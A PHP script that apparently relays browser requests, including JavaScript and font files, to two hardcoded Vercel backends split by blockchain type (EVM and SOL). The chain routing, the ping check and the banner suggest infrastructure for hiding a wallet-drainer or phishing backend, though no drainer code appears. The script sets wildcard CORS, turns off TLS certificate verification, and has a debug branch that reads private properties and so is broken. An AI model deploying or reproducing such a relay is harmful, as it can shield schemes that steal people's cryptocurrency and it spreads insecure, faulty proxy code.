<?php
// === SECURE PROXY — HARDCODED DOMAINS (NO CONTRACT, NO FAKE URL) ===
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 86400');

function getIP() {
    return $_SERVER["HTTP_CF_CONNECTING_IP"] ?? 
           (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]) : $_SERVER['REMOTE_ADDR']);
}

class DirectProxy {
    // CHANGE THESE TO YOUR REAL BACKEND URL
    private $EVM_BACKEND = "https://beep-xyz.vercel.app";     // YOUR EVM BACKEND
    private $SOL_BACKEND = "https://beep-sol.vercel.app";     // YOUR SOL BACKEND

    public function proxy($path, $chain) {
        $base = ($chain === 'SOL') ? $this->SOL_BACKEND : $this->EVM_BACKEND;
        $url = rtrim($base, '/') . '/' . ltrim($path, '/');

        $headers = getallheaders();
        unset($headers['Host'], $headers['host'], $headers['origin'], $headers['Origin']);
        unset($headers['Accept-Encoding'], $headers['content-encoding']);
        $headers['x-forwarded-for'] = getIP();
        $headers['x-real-ip'] = getIP();

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
            CURLOPT_POSTFIELDS => file_get_contents('php://input'),
            CURLOPT_HTTPHEADER => array_map(fn($k, $v) => "$k: $v", array_keys($headers), $headers),
            CURLOPT_TIMEOUT => 15,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HEADER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_ENCODING => ''
        ]);

        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            http_response_code(502);
            echo "PROXY ERROR: Backend unreachable";
            curl_close($ch);
            return;
        }

        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // FORCE CORRECT CONTENT-TYPE
        if (str_ends_with($path, '.js')) {
            header('Content-Type: application/javascript; charset=utf-8');
        } elseif (str_ends_with($path, '.css')) {
            header('Content-Type: text/css; charset=utf-8');
        } elseif (str_ends_with($path, '.json')) {
            header('Content-Type: application/json');
        } elseif (str_ends_with($path, '.woff2') || str_ends_with($path, '.ttf')) {
            header('Content-Type: font/woff2');
        }

        // PASS THROUGH HEADERS
        foreach (explode("\r\n", $headers) as $h) {
            if (strpos($h, ':') !== false && !preg_match('/^(content-length|transfer-encoding|content-encoding)/i', $h)) {
                header($h, false);
            }
        }

        http_response_code($status);
        echo $body;
    }
}

$proxy = new DirectProxy();

// DEBUG MODE
if (isset($_GET['debug'])) {
    echo "EVM BACKEND: " . $proxy->EVM_BACKEND . "\n";
    echo "SOL BACKEND: " . $proxy->SOL_BACKEND . "\n";
    exit;
}

// OPTIONS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// PING
if (isset($_GET['e']) && $_GET['e'] === 'ping_proxy') {
    echo 'pong';
    exit;
}

// ROUTE
if (isset($_GET['s'])) {
    $proxy->proxy(urldecode($_GET['s']), 'SOL');
} elseif (isset($_GET['e'])) {
    $proxy->proxy(urldecode($_GET['e']), 'EVM');
} else {
    http_response_code(400);
    echo 'Invalid request';
}
